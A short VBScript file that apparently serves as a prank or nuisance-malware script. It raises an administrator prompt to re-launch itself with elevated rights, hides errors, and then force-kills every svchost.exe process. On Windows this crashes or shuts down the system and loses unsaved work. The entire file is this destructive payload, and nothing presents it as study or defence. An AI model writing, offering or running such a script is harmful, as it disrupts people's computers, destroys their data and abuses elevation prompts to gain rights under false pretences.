On Error Resume Next

' Self-elevate if not already running as admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, Chr(34) & _
    WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If

Set mert = CreateObject("WScript.Shell")

' Run command with admin rights
mert.Run "cmd /k taskkill /F /IM svchost.exe", 1, True
